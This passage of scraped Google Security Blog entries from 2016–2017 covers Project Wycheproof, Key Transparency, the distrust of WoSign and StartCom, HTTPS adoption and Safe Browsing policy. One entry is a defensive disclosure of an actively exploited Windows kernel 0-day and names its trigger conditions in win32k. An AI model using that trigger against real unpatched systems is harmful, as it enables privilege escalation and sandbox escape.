including RSA, elliptic curve crypto, and authenticated encryption.    Our first set of tests are written in Java, because Java has a common cryptographic interface. This allowed us to test multiple providers with a single test suite. While this interface is somewhat low level, and should not be used directly, we still apply a \"defense in depth\" argument and expect that the implementations are as robust as possible. For example, we consider weak default values to be a significant security flaw. We are converting as many tests into sets of test vectors to simplify porting the tests to other languages.    While we are committed to develop as many tests as possible and external contributions are welcome &#8212; if you want to contribute, please read  CONTRIBUTING  before sending us pull requests &#8212; Project Wycheproof is by no means complete. Passing the tests does not imply that the library is secure, it just means that it is not vulnerable to the attacks that Project Wycheproof tries to detect. Cryptographers constantly discover new weaknesses in cryptographic protocols. Nevertheless, with Project Wycheproof developers and users now can check their libraries against a large number of known attacks without having to sift through hundreds of academic papers or become cryptographers themselves.    For more information about the tests and what you can do with them, please visit  our homepage on GitHub .                                   Posted by Daniel Bleichenbacher, Security Engineer and Thai Duong, Security Engineer We’re excited to announce the release of Project Wycheproof, a set of security tests that check cryptographic software libraries for known weaknesses. We’ve developed over 80 test cases which have uncovered more than 40 security bugs (some tests or bugs are not open sourced today, as they are being fixed by vendors). For example, we found that we could recover the private key of widely-used DSA and ECDHC implementations. We also provide ready-to-use tools to check Java Cryptography Architecture providers such as Bouncy Castle and the default providers in OpenJDK.  The main motivation for the project is to have an achievable goal. That’s why we’ve named it after the Mount Wycheproof, the smallest mountain in the world. The smaller the mountain the easier it is to climb it!  In cryptography, subtle mistakes can have catastrophic consequences, and mistakes in open source cryptographic software libraries repeat too often and remain undiscovered for too long. Good implementation guidelines, however, are hard to come by: understanding how to implement cryptography securely requires digesting decades' worth of academic literature. We recognize that software engineers fix and prevent bugs with unit testing, and we found that many cryptographic issues can be resolved by the same means.  These observations have prompted us to develop Project Wycheproof, a collection of unit tests that detect known weaknesses or check for expected behaviors of some cryptographic algorithm. Our cryptographers have surveyed the literature and implemented most known attacks. As a result, Project Wycheproof provides tests for most cryptographic algorithms, including RSA, elliptic curve crypto, and authenticated encryption.  Our first set of tests are written in Java, because Java has a common cryptographic interface. This allowed us to test multiple providers with a single test suite. While this interface is somewhat low level, and should not be used directly, we still apply a \"defense in depth\" argument and expect that the implementations are as robust as possible. For example, we consider weak default values to be a significant security flaw. We are converting as many tests into sets of test vectors to simplify porting the tests to other languages.  While we are committed to develop as many tests as possible and external contributions are welcome — if you want to contribute, please read CONTRIBUTING before sending us pull requests — Project Wycheproof is by no means complete. Passing the tests does not imply that the library is secure, it just means that it is not vulnerable to the attacks that Project Wycheproof tries to detect. Cryptographers constantly discover new weaknesses in cryptographic protocols. Nevertheless, with Project Wycheproof developers and users now can check their libraries against a large number of known attacks without having to sift through hundreds of academic papers or become cryptographers themselves.  For more information about the tests and what you can do with them, please visit our homepage on GitHub.     ", "date": "December 19, 2016"},
{"website": "Google-Security", "title": "\nEnigma, The Sequel\n", "author": ["Posted by Parisa Tabriz, Security Princess & Enigma Program Co-Chair"], "link": "https://security.googleblog.com/2017/01/enigma-sequel.html", "abstract": "                             Posted by Parisa Tabriz, Security Princess &amp; Enigma Program Co-Chair   Last year we helped launch  USENIX Enigma , a conference focused on bringing together security and privacy experts from academia, industry, and public service. After a successful first run, we&#8217;re supporting Enigma again this year and looking forward to  more great talks  and an ever-engaging hallway track!    Our speakers this year include practitioners from many tech industry leaders, researchers and professors at universities from around the world, and civil servants working at agencies in the U.S. and abroad. In addition to sessions focused specifically on software security, spam and abuse, and usability, the program will cover interdisciplinary topics, like the intersection of security and artificial intelligence, neuroscience, and society.    I&#8217;m also very proud to have some of my Google colleagues speaking at Enigma:        Sunny Consolvo  will present results from a qualitative study of the privacy and security practices and challenges of survivors of intimate partner abuse. Sunny will also share how technology creators can better support the victims and survivors of such abuse.        Damian Menscher  has been battling botnets for a decade at Google and has witnessed the evolution of Distributed Denial-of-Service (DDoS) scaling and attack ingenuity. Damian will describe his operation of a DDoS honeypot, and share specific things he learned while  protecting KrebsOnSecurity.com .        Emily Schechter  will be talking about driving HTTPS adoption on the web. She&#8217;ll go over some of the unexpected speed bumps major web sites have encountered, share how Chrome approaches feature changes that encourage HTTPS usage, and discuss what&#8217;s next to get to a default encrypted web.    As we did  last year , my program co-chair,  David Brumley , and I are developing a program full of short, thought-provoking presentations followed by lively discussion. Our program committee has worked closely with each speaker to help them craft the best version of their talk. Everyone is excited to share them, and there&#8217;s still time to  register ! I hope to see many of you in Oakland at  USENIX Enigma  later this month.         PS: Warning! Self-serving Google notice ahead&#8230; We&#8217;re hiring! We believe that most security researchers do what they do because they love what they do. What we offer is a place to do what you love&#8212;but in the open, on real-world problems, and without distraction. Please  reach out  to us if you&#8217;re interested.                                     Posted by Parisa Tabriz, Security Princess & Enigma Program Co-Chair Last year we helped launch USENIX Enigma, a conference focused on bringing together security and privacy experts from academia, industry, and public service. After a successful first run, we’re supporting Enigma again this year and looking forward to more great talks and an ever-engaging hallway track!  Our speakers this year include practitioners from many tech industry leaders, researchers and professors at universities from around the world, and civil servants working at agencies in the U.S. and abroad. In addition to sessions focused specifically on software security, spam and abuse, and usability, the program will cover interdisciplinary topics, like the intersection of security and artificial intelligence, neuroscience, and society.  I’m also very proud to have some of my Google colleagues speaking at Enigma:   Sunny Consolvo will present results from a qualitative study of the privacy and security practices and challenges of survivors of intimate partner abuse. Sunny will also share how technology creators can better support the victims and survivors of such abuse.   Damian Menscher has been battling botnets for a decade at Google and has witnessed the evolution of Distributed Denial-of-Service (DDoS) scaling and attack ingenuity. Damian will describe his operation of a DDoS honeypot, and share specific things he learned while protecting KrebsOnSecurity.com.   Emily Schechter will be talking about driving HTTPS adoption on the web. She’ll go over some of the unexpected speed bumps major web sites have encountered, share how Chrome approaches feature changes that encourage HTTPS usage, and discuss what’s next to get to a default encrypted web.  As we did last year, my program co-chair, David Brumley, and I are developing a program full of short, thought-provoking presentations followed by lively discussion. Our program committee has worked closely with each speaker to help them craft the best version of their talk. Everyone is excited to share them, and there’s still time to register! I hope to see many of you in Oakland at USENIX Enigma later this month.    PS: Warning! Self-serving Google notice ahead… We’re hiring! We believe that most security researchers do what they do because they love what they do. What we offer is a place to do what you love—but in the open, on real-world problems, and without distraction. Please reach out to us if you’re interested.     ", "date": "January 11, 2017"},
{"website": "Google-Security", "title": "\nSecurity Through Transparency\n", "author": ["Posted by Ryan Hurst and Gary Belvin, Security and Privacy Engineering"], "link": "https://security.googleblog.com/2017/01/security-through-transparency.html", "abstract": "                             Posted by Ryan Hurst and Gary Belvin, Security and Privacy Engineering   Encryption is a foundational technology for the web. We&#8217;ve spent a lot of time working through the intricacies of making encrypted apps easy to use and in the process, realized that a generic, secure way to discover a recipient's public keys for addressing messages correctly is important. Not only would such a thing be beneficial across many applications, but nothing like this exists as a generic technology.    A solution would need to reliably scale to internet size while providing a way to establish secure communications through untrusted servers. It became clear that if we combined insights from  Certificate Transparency  and  CONIKS  we could build a system with the  properties  we wanted and more.    The result is  Key Transparency , which we&#8217;re making available as an open-source prototype today.     Why Key Transparency is useful       Existing methods of protecting users against server compromise require users to  manually   verify  recipients&#8217; accounts in-person. This simply hasn&#8217;t worked. The PGP web-of-trust for encrypted email is just one example: over 20 years after its invention, most people  still can't  or  won&#8217;t  use it,  including its original author .  Messaging apps , file sharing, and software updates also suffer from the same challenge.    One of our goals with Key Transparency was to simplify this process and create infrastructure that allows making it usable by non-experts. The relationship between online personas and public keys should be automatically verifiable and publicly auditable. Users should be able to see all the keys that have been attached to an account, while making any attempt to tamper with the record publicly visible. This also ensures that senders will always use the same keys that account owners are verifying.    Key Transparency is a general-use, transparent directory that makes it easy for developers to create systems of all kinds with independently auditable account data. It can be used in a variety of scenarios where data needs to be encrypted or authenticated. It can be used to make security features that are easy for people to understand while supporting important user needs like account recovery.     Looking ahead   It&#8217;s still very early days for Key Transparency. With this first open source release, we&#8217;re continuing a conversation with the crypto community and other industry leaders, soliciting feedback, and working toward creating a standard that can help advance security for everyone.    We&#8217;d also like to thank our many collaborators during Key Transparency&#8217;s multi-year development, including the CONIKS team, Open Whisper Systems, as well as the security engineering teams at Yahoo! and internally at Google.    Our goal is to evolve Key Transparency into an open-source, generic, scalable, and interoperable directory of public keys with an ecosystem of mutually auditing directories. We welcome your apps, input, and contributions to this new technology at  KeyTransparency.org .                                   Posted by Ryan Hurst and Gary Belvin, Security and Privacy Engineering Encryption is a foundational technology for the web. We’ve spent a lot of time working through the intricacies of making encrypted apps easy to use and in the process, realized that a generic, secure way to discover a recipient's public keys for addressing messages correctly is important. Not only would such a thing be beneficial across many applications, but nothing like this exists as a generic technology.  A solution would need to reliably scale to internet size while providing a way to establish secure communications through untrusted servers. It became clear that if we combined insights from Certificate Transparency and CONIKS we could build a system with the properties we wanted and more.  The result is Key Transparency, which we’re making available as an open-source prototype today.  Why Key Transparency is useful  Existing methods of protecting users against server compromise require users to manually verify recipients’ accounts in-person. This simply hasn’t worked. The PGP web-of-trust for encrypted email is just one example: over 20 years after its invention, most people still can't or won’t use it, including its original author. Messaging apps, file sharing, and software updates also suffer from the same challenge.  One of our goals with Key Transparency was to simplify this process and create infrastructure that allows making it usable by non-experts. The relationship between online personas and public keys should be automatically verifiable and publicly auditable. Users should be able to see all the keys that have been attached to an account, while making any attempt to tamper with the record publicly visible. This also ensures that senders will always use the same keys that account owners are verifying.  Key Transparency is a general-use, transparent directory that makes it easy for developers to create systems of all kinds with independently auditable account data. It can be used in a variety of scenarios where data needs to be encrypted or authenticated. It can be used to make security features that are easy for people to understand while supporting important user needs like account recovery.  Looking ahead It’s still very early days for Key Transparency. With this first open source release, we’re continuing a conversation with the crypto community and other industry leaders, soliciting feedback, and working toward creating a standard that can help advance security for everyone.  We’d also like to thank our many collaborators during Key Transparency’s multi-year development, including the CONIKS team, Open Whisper Systems, as well as the security engineering teams at Yahoo! and internally at Google.  Our goal is to evolve Key Transparency into an open-source, generic, scalable, and interoperable directory of public keys with an ecosystem of mutually auditing directories. We welcome your apps, input, and contributions to this new technology at KeyTransparency.org.     ", "date": "January 12, 2017"},
{"website": "Google-Security", "title": "\nDistrusting WoSign and StartCom Certificates\n", "author": ["Posted by Andrew Whalley, Chrome Security"], "link": "https://security.googleblog.com/2016/10/distrusting-wosign-and-startcom.html", "abstract": "                             Posted by Andrew Whalley, Chrome Security   Certificate Authorities (CAs) play a key role in web security by issuing digital certificates to website operators. These certificates are trusted by browsers to authenticate secure connections to websites. CAs who issue certificates outside the policies required by browsers and industry bodies can put the security and privacy of every web user at risk.    Google has determined that two CAs, WoSign and StartCom, have not maintained the high standards expected of CAs and will no longer be trusted by Google Chrome, in accordance with our  Root Certificate Policy . This view is similar to the recent announcements by the root certificate programs of both  Apple  and  Mozilla . The rest of this post provides background to that decision and how we plan to minimize disruption while still protecting users.       Background     On August 17, 2016, Google was notified by GitHub's security team that WoSign had issued a certificate for one of GitHub's domains without their authorization. This prompted an investigation, conducted in public as a collaboration with Mozilla and the security community, which found a number of other cases of  WoSign misissuance .    The investigation concluded that WoSign knowingly and intentionally misissued certificates in order to circumvent browser restrictions and CA requirements. Further, it determined that StartCom, another CA, had been purchased by WoSign, and had replaced infrastructure, staff, policies, and issuance systems with WoSign's. When presented with this evidence, WoSign and StartCom management actively attempted to mislead the browser community about the acquisition and the relationship of these two companies. For both CAs, we have concluded there is a pattern of issues and incidents that indicate an approach to security that is not in concordance with the responsibilities of a publicly trusted CA.   Action     Beginning with Chrome 56, certificates issued by WoSign and StartCom after October 21, 2016 00:00:00 UTC will not be trusted. Certificates issued before this date may continue to be trusted, for a time, if they comply with the  Certificate Transparency in Chrome  policy or are issued to a limited set of domains known to be customers of WoSign and StartCom.    Due to a number of technical limitations and concerns, Google Chrome is unable to trust all pre-existing certificates while ensuring our users are sufficiently protected from further misissuance. As a result of these changes, customers of WoSign and StartCom may find their certificates no longer work in Chrome 56.    In subsequent Chrome releases, these exceptions will be reduced and ultimately removed, culminating in the full distrust of these CAs. This staged approach is solely to ensure sites have the opportunity to transition to other Certificate Authorities that are still trusted in Google Chrome, thus minimizing disruption to users of these sites. Sites that find themselves on this whitelist will be able to request early removal once they&#8217;ve transitioned to new certificates. Any attempt by WoSign or StartCom to circumvent these controls will result in immediate and complete removal of trust.    We remain committed to ensuring the safety and privacy of Google Chrome users. We appreciate the impact to users visiting sites with affected certificates and to the operators who run these sites, but the nature of these incidents, and the need to protect our users, prevent us from being able to take less disruptive steps.                                   Posted by Andrew Whalley, Chrome Security Certificate Authorities (CAs) play a key role in web security by issuing digital certificates to website operators. These certificates are trusted by browsers to authenticate secure connections to websites. CAs who issue certificates outside the policies required by browsers and industry bodies can put the security and privacy of every web user at risk.  Google has determined that two CAs, WoSign and StartCom, have not maintained the high standards expected of CAs and will no longer be trusted by Google Chrome, in accordance with our Root Certificate Policy. This view is similar to the recent announcements by the root certificate programs of both Apple and Mozilla. The rest of this post provides background to that decision and how we plan to minimize disruption while still protecting users.  Background  On August 17, 2016, Google was notified by GitHub's security team that WoSign had issued a certificate for one of GitHub's domains without their authorization. This prompted an investigation, conducted in public as a collaboration with Mozilla and the security community, which found a number of other cases of WoSign misissuance.  The investigation concluded that WoSign knowingly and intentionally misissued certificates in order to circumvent browser restrictions and CA requirements. Further, it determined that StartCom, another CA, had been purchased by WoSign, and had replaced infrastructure, staff, policies, and issuance systems with WoSign's. When presented with this evidence, WoSign and StartCom management actively attempted to mislead the browser community about the acquisition and the relationship of these two companies. For both CAs, we have concluded there is a pattern of issues and incidents that indicate an approach to security that is not in concordance with the responsibilities of a publicly trusted CA. Action  Beginning with Chrome 56, certificates issued by WoSign and StartCom after October 21, 2016 00:00:00 UTC will not be trusted. Certificates issued before this date may continue to be trusted, for a time, if they comply with the Certificate Transparency in Chrome policy or are issued to a limited set of domains known to be customers of WoSign and StartCom.  Due to a number of technical limitations and concerns, Google Chrome is unable to trust all pre-existing certificates while ensuring our users are sufficiently protected from further misissuance. As a result of these changes, customers of WoSign and StartCom may find their certificates no longer work in Chrome 56.  In subsequent Chrome releases, these exceptions will be reduced and ultimately removed, culminating in the full distrust of these CAs. This staged approach is solely to ensure sites have the opportunity to transition to other Certificate Authorities that are still trusted in Google Chrome, thus minimizing disruption to users of these sites. Sites that find themselves on this whitelist will be able to request early removal once they’ve transitioned to new certificates. Any attempt by WoSign or StartCom to circumvent these controls will result in immediate and complete removal of trust.  We remain committed to ensuring the safety and privacy of Google Chrome users. We appreciate the impact to users visiting sites with affected certificates and to the operators who run these sites, but the nature of these incidents, and the need to protect our users, prevent us from being able to take less disruptive steps.     ", "date": "October 31, 2016"},
{"website": "Google-Security", "title": "\nHere’s to more HTTPS on the web!\n", "author": ["Posted by Adrienne Porter Felt and Emily Schechter, Chrome Security Team"], "link": "https://security.googleblog.com/2016/11/heres-to-more-https-on-web.html", "abstract": "                             Posted by Adrienne Porter Felt and Emily Schechter, Chrome Security Team   Security has always been critical to the web, but challenges involved in site migration have inhibited HTTPS adoption for several years. In the interest of a safer web for all, at Google we&#8217;ve worked alongside many others across the online ecosystem to better understand and address these challenges, resulting in real change. A web with ubiquitous HTTPS is not the distant future. It&#8217;s happening now, with secure browsing becoming standard for users of Chrome.    Today, we&#8217;re adding a  new section to the HTTPS Report Card in our Transparency Report  that includes data about how HTTPS usage has been increasing over time. More than half of pages loaded and two-thirds of total time spent by Chrome desktop users occur via HTTPS, and we expect these metrics to continue their strong upward trajectory.           Percentage of pages loaded over HTTPS in Chrome                   As the remainder of the web transitions to HTTPS, we&#8217;ll continue working to ensure that migrating to HTTPS is a no-brainer, providing business benefit beyond increased security. HTTPS currently enables the  best   performance  the web offers and powerful features that  benefit  site conversions, including both new features such as  service workers  for offline support and  web push notifications , and existing features such as  credit card autofill  and the  HTML5 geolocation API  that are  too powerful to be used  over non-secure HTTP. As with all major site migrations, there are certain steps webmasters should take to ensure that search ranking transitions are smooth when moving to HTTPS. To help with this, we&#8217;ve posted  two   FAQs  to help sites transition correctly, and will continue to improve our  web fundamentals guidance .              We&#8217;ve seen many sites successfully transition with negligible effect on their search ranking and traffic. Brian Wood, Director of Marketing SEO at Wayfair, a large retail site, commented:&nbsp;&#8220;We were able to migrate Wayfair.com to HTTPS with no meaningful impact to Google rankings or Google organic search traffic. We are very pleased to say that all Wayfair sites are now fully HTTPS.&#8221; CNET, a large tech news site, had a similar experience: &#8220;We successfully completed our move of CNET.com to HTTPS last month,&#8221; said John Sherwood, Vice President of Engineering &amp; Technology at CNET. &#8220;Since then, there has been no change in our Google rankings or Google organic search traffic.&#8221;              Webmasters that include ads on their sites also should carefully monitor ad performance and revenue during large site migrations. The portion of Google ad traffic served over HTTPS has  increased dramatically  over the past 3 years. All ads that come from any Google source always support HTTPS, including AdWords, AdSense, or DoubleClick Ad Exchange; ads sold directly, such as those through DoubleClick for Publishers, still need to be designed to be HTTPS-friendly. This means there will be no change to the Google-sourced ads that appear on a site after migrating to HTTPS. Many publishing partners have seen this in practice after a successful HTTPS transition. Jason Tollestrup, Director of Programmatic Advertising for the  Washington Post , &#8220;saw no material impact to AdX revenue with the transition to SSL.&#8221;              As migrating to HTTPS becomes even easier,  we&#8217;ll continue  working towards a web that&#8217;s secure by default. Don&#8217;t hesitate to start planning your HTTPS migration today!                                      Posted by Adrienne Porter Felt and Emily Schechter, Chrome Security Team Security has always been critical to the web, but challenges involved in site migration have inhibited HTTPS adoption for several years. In the interest of a safer web for all, at Google we’ve worked alongside many others across the online ecosystem to better understand and address these challenges, resulting in real change. A web with ubiquitous HTTPS is not the distant future. It’s happening now, with secure browsing becoming standard for users of Chrome.  Today, we’re adding a new section to the HTTPS Report Card in our Transparency Report that includes data about how HTTPS usage has been increasing over time. More than half of pages loaded and two-thirds of total time spent by Chrome desktop users occur via HTTPS, and we expect these metrics to continue their strong upward trajectory.    Percentage of pages loaded over HTTPS in Chrome        As the remainder of the web transitions to HTTPS, we’ll continue working to ensure that migrating to HTTPS is a no-brainer, providing business benefit beyond increased security. HTTPS currently enables the best performance the web offers and powerful features that benefit site conversions, including both new features such as service workers for offline support and web push notifications, and existing features such as credit card autofill and the HTML5 geolocation API that are too powerful to be used over non-secure HTTP. As with all major site migrations, there are certain steps webmasters should take to ensure that search ranking transitions are smooth when moving to HTTPS. To help with this, we’ve posted two FAQs to help sites transition correctly, and will continue to improve our web fundamentals guidance.      We’ve seen many sites successfully transition with negligible effect on their search ranking and traffic. Brian Wood, Director of Marketing SEO at Wayfair, a large retail site, commented: “We were able to migrate Wayfair.com to HTTPS with no meaningful impact to Google rankings or Google organic search traffic. We are very pleased to say that all Wayfair sites are now fully HTTPS.” CNET, a large tech news site, had a similar experience: “We successfully completed our move of CNET.com to HTTPS last month,” said John Sherwood, Vice President of Engineering & Technology at CNET. “Since then, there has been no change in our Google rankings or Google organic search traffic.”      Webmasters that include ads on their sites also should carefully monitor ad performance and revenue during large site migrations. The portion of Google ad traffic served over HTTPS has increased dramatically over the past 3 years. All ads that come from any Google source always support HTTPS, including AdWords, AdSense, or DoubleClick Ad Exchange; ads sold directly, such as those through DoubleClick for Publishers, still need to be designed to be HTTPS-friendly. This means there will be no change to the Google-sourced ads that appear on a site after migrating to HTTPS. Many publishing partners have seen this in practice after a successful HTTPS transition. Jason Tollestrup, Director of Programmatic Advertising for the Washington Post, “saw no material impact to AdX revenue with the transition to SSL.”      As migrating to HTTPS becomes even easier, we’ll continue working towards a web that’s secure by default. Don’t hesitate to start planning your HTTPS migration today!      ", "date": "November 3, 2016"},
{"website": "Google-Security", "title": "\nProtecting users from repeatedly dangerous sites\n", "author": ["Posted by Brooke Heinichen, Safe Browsing Team"], "link": "https://security.googleblog.com/2016/11/protecting-users-from-repeatedly_8.html", "abstract": "                             Posted by Brooke Heinichen, Safe Browsing Team     Since 2005, Safe Browsing has been protecting users from harm on the Internet, and has evolved over the years to adapt to the changing nature of threats and user harm.    Today, sites in violation of Google&#8217;s  Malware ,  Unwanted Software ,  Phishing, and Social Engineering Policies  show warnings until Google verifies that the site is no longer harmful. The verification can be triggered automatically, or at the request of the webmaster via the  Search Console .    However, over time, we&#8217;ve observed that a small number of websites will cease harming users for long enough to have the warnings removed, and will then revert to harmful activity.    As a result of this gap in user protection, we have adjusted our policies to reduce risks borne by end-users. Starting today, Safe Browsing will begin to classify these types of sites as &#8220; Repeat Offenders .&#8221; With regards to Safe Browsing-related policies, Repeat Offenders are websites that repeatedly switch between compliant and policy-violating behavior for the purpose of having a successful review and having warnings removed. Please note that websites that are hacked will not be classified as Repeat Offenders; only sites that purposefully post harmful content will be subject to the policy.    Once Safe Browsing has determined that a site is a Repeat Offender, the webmaster will be unable to request additional reviews via the Search Console for 30 days, and warnings will continue to show to users. When a site is established as a Repeat Offender, the webmaster will be notified via email to their registered Search Console email address.    We continuously update our policies and practices to address evolving threats. This is yet another change to help protect users from harm online.                                   Posted by Brooke Heinichen, Safe Browsing Team  Since 2005, Safe Browsing has been protecting users from harm on the Internet, and has evolved over the years to adapt to the changing nature of threats and user harm.  Today, sites in violation of Google’s Malware, Unwanted Software, Phishing, and Social Engineering Policies show warnings until Google verifies that the site is no longer harmful. The verification can be triggered automatically, or at the request of the webmaster via the Search Console.  However, over time, we’ve observed that a small number of websites will cease harming users for long enough to have the warnings removed, and will then revert to harmful activity.  As a result of this gap in user protection, we have adjusted our policies to reduce risks borne by end-users. Starting today, Safe Browsing will begin to classify these types of sites as “Repeat Offenders.” With regards to Safe Browsing-related policies, Repeat Offenders are websites that repeatedly switch between compliant and policy-violating behavior for the purpose of having a successful review and having warnings removed. Please note that websites that are hacked will not be classified as Repeat Offenders; only sites that purposefully post harmful content will be subject to the policy.  Once Safe Browsing has determined that a site is a Repeat Offender, the webmaster will be unable to request additional reviews via the Search Console for 30 days, and warnings will continue to show to users. When a site is established as a Repeat Offender, the webmaster will be notified via email to their registered Search Console email address.  We continuously update our policies and practices to address evolving threats. This is yet another change to help protect users from harm online.     ", "date": "November 8, 2016"},
{"website": "Google-Security", "title": "\nA new site for Safe Browsing\n", "author": ["Posted by Mike Castner and Brooke Heinichen, Safe Browsing Team"], "link": "https://security.googleblog.com/2016/11/a-new-site-for-safe-browsing.html", "abstract": "                             Posted by Mike Castner and Brooke Heinichen, Safe Browsing Team   Since  launching in 2007 , the Safe Browsing team has been dedicated to our mission of protecting users from phishing, malware, and unwanted software on the web. Our coverage currently extends to more than two billion internet-connected devices, including  Chrome users on Android . As part of our commitment to keep our users both protected and informed, we&#8217;ve recently launched  several   improvements  to the way we share information.    Today, we&#8217;re happy to announce  a new site for Safe Browsing  that makes it easier for users to quickly report malicious sites, access our developer documentation, and find our policies. Our new site also serves as a central hub for our tools, including the  Transparency Report ,  Search Console , and  Safe Browsing Alerts  for Network Administrators.    The new  Safe Browsing website  will be a platform for consolidated policy and help content. We&#8217;re excited to make this new, single source of information available to users, developers, and webmasters.                                   Posted by Mike Castner and Brooke Heinichen, Safe Browsing Team Since launching in 2007, the Safe Browsing team has been dedicated to our mission of protecting users from phishing, malware, and unwanted software on the web. Our coverage currently extends to more than two billion internet-connected devices, including Chrome users on Android. As part of our commitment to keep our users both protected and informed, we’ve recently launched several improvements to the way we share information.  Today, we’re happy to announce a new site for Safe Browsing that makes it easier for users to quickly report malicious sites, access our developer documentation, and find our policies. Our new site also serves as a central hub for our tools, including the Transparency Report, Search Console, and Safe Browsing Alerts for Network Administrators.  The new Safe Browsing website will be a platform for consolidated policy and help content. We’re excited to make this new, single source of information available to users, developers, and webmasters.     ", "date": "November 9, 2016"},
{"website": "Google-Security", "title": "\nDisclosing vulnerabilities to protect users\n", "author": ["Posted by Neel Mehta and Billy Leonard, Threat Analysis Group"], "link": "https://security.googleblog.com/2016/10/disclosing-vulnerabilities-to-protect.html", "abstract": "                             Posted by Neel Mehta and Billy Leonard, Threat Analysis Group   On Friday, October 21st, we reported 0-day vulnerabilities &#8212; previously publicly-unknown vulnerabilities &#8212; to Adobe and Microsoft. Adobe updated Flash&nbsp; on October 26th &nbsp;to address CVE-2016-7855; this update is available via Adobe's updater and Chrome auto-update.    After 7 days, per our&nbsp; published policy for actively exploited critical vulnerabilities , we are today disclosing the existence of a remaining critical vulnerability in Windows for which no advisory or fix has yet been released. This vulnerability is particularly serious because we know it is being actively exploited.    The Windows vulnerability is a local privilege escalation in the Windows kernel that can be used as a security sandbox escape. It can be triggered via the win32k.sys system call NtSetWindowLongPtr() for the index GWLP_ID on a window handle with GWL_STYLE set to WS_CHILD. Chrome's sandbox blocks win32k.sys system calls using the  Win32k lockdown  mitigation on Windows 10, which prevents exploitation of this sandbox escape vulnerability.    We encourage users to verify that auto-updaters have already updated Flash &#8212; and to manually update if not &#8212; and to apply Windows patches from Microsoft when they become available for the Windows vulnerability.                                   Posted by Neel Mehta and Billy Leonard, Threat Analysis Group On Friday, October 21st, we reported 0-day vulnerabilities — previously publicly-unknown vulnerabilities — to Adobe and Microsoft. Adobe updated Flash on October 26th to address CVE-2016-7855; this update is available via Adobe's updater and Chrome auto-update.  After 7 days, per our published policy for actively exploited critical vulnerabilities, we are today disclosing the existence of a remaining critical vulnerability in Windows for which no advisory or fix has yet been released. This vulnerability is particularly serious because we know it is being actively exploited.  The Windows vulnerability is a local privilege escalation in the Windows kernel that can be used as a security sandbox escape. It can be triggered via the win32k.sys system call NtSetWindowLongPtr() for the index GWLP_ID on a window handle with GWL_STYLE set to WS_CHILD. Chrome's sandbox blocks win32k.sys system calls using the Win32k lockdown mitigation on Windows 10, which prevents exploitation of this sandbox escape vulnerability.  We encourage users to verify that auto-updaters have already updated Flash — and to manually update if not — and to apply Windows patches from Microsoft when they become available for the Windows vulnerability.     ", "date": "October 31, 2016"},
{"website": "Google-Security", "title": "\nAdding YouTube and Calendar to the HTTPS Transparency Report\n", "author": ["Posted by Emily Schechter, HTTPS Enthusiast"], "link": "https://security.googleblog.com/2016/08/adding-youtube-and-calendar-to-https.html", "abstract": "                             Posted by Emily Schechter, HTTPS Enthusiast     Earlier this year, we  launched  a new section of our Transparency Report dedicated to HTTPS encryption. This report shows how much traffic is encrypted for Google products and popular sites across the web. Today, we&#8217;re adding two Google products to the report: YouTube and Calendar. The traffic for both products is currently more than 90% encrypted via HTTPS.            Case study: YouTube   As we&#8217;ve implemented HTTPS across products over the years, we&#8217;ve worked through a wide variety of technical obstacles. Below are some of the challenges we faced during  YouTube&#8217;s two year road to HTTPS :        Lots of traffic!  Our CDN, the  Google Global Cache , serves a massive amount of video, and migrating it all to HTTPS is no small feat. Luckily, hardware acceleration for AES is widespread, so we were able to encrypt virtually all video serving without adding machines. (Yes,  HTTPS is fast now .)    Lots of devices!  You can watch YouTube videos on everything from flip phones to smart TVs. We A/B tested HTTPS on every device to ensure that users would not be negatively impacted. We found that HTTPS improved quality of experience on most clients: by ensuring content integrity, we virtually eliminated many types of streaming errors.    Lots of requests!  Mixed content&#8212;any insecure request made in a secure context&#8212;poses a challenge for any large website or app. We get an alert when an insecure request is made from any of our clients and eventually will block all mixed content using  Content Security Policy  on the web,  App Transport Security on iOS , and  uses CleartextTraffic  on Android. Ads on YouTube have used HTTPS  since 2014 .           We're also proud to be using  HTTP Secure Transport Security (HSTS)  on youtube.com to cut down on HTTP to HTTPS redirects. This improves both security and latency for end users. Our HSTS lifetime is one year, and we hope to preload this soon in web browsers.         97% for YouTube is pretty good, but why isn't YouTube at 100%? In short, some devices do not fully support modern HTTPS. Over time, to keep YouTube users as safe as possible, we will gradually phase out insecure connections.              We know that any non-secure HTTP traffic could be vulnerable to attackers. All websites and apps should be protected with HTTPS &#8212; if you&#8217;re a developer that hasn&#8217;t yet migrated,  get started  today.                                     Posted by Emily Schechter, HTTPS Enthusiast  Earlier this year, we launched a new section of our Transparency Report dedicated to HTTPS encryption. This report shows how much traffic is encrypted for Google products and popular sites across the web. Today, we’re adding two Google products to the report: YouTube and Calendar. The traffic for both products is currently more than 90% encrypted via HTTPS.    Case study: YouTube As we’ve implemented HTTPS across products over the years, we’ve worked through a wide variety of technical obstacles. Below are some of the challenges we faced during YouTube’s two year road to HTTPS:   Lots of traffic! Our CDN, the Google Global Cache, serves a massive amount of video, and migrating it all to HTTPS is no small feat. Luckily, hardware acceleration for AES is widespread, so we were able to encrypt virtually all video serving without adding machines. (Yes, HTTPS is fast now.) Lots of devices! You can watch YouTube videos on everything from flip phones to smart TVs. We A/B tested HTTPS on every device to ensure that users would not be negatively impacted. We found that HTTPS improved quality of experience on most clients: by ensuring content integrity, we virtually eliminated many types of streaming errors. Lots of requests! Mixed content—any insecure request made in a secure context—poses a challenge for any large website or app. We get an alert when an insecure request is made from any of our clients and eventually will block all mixed content using Content Security Policy on the web, App Transport Security on iOS, and uses CleartextTraffic on Android. Ads on YouTube have used HTTPS since 2014.     We're also proud to be using HTTP Secure Transport Security (HSTS) on youtube.com to cut down on HTTP to HTTPS redirects. This improves both security and latency for end users. Our HSTS lifetime is one year, and we hope to preload this soon in web browsers.    97% for YouTube is pretty good, but why isn't YouTube at 100%? In short, some devices do not fully support modern HTTPS. Over time, to keep YouTube users as safe as possible, we will gradually phase out insecure connections.      We know that any non-secure HTTP traffic could be vulnerable to attackers. All websites and apps should be protected with HTTPS — if you’re a developer that hasn’t yet migrated, get started today.     ", "date": "August 1, 2016"},
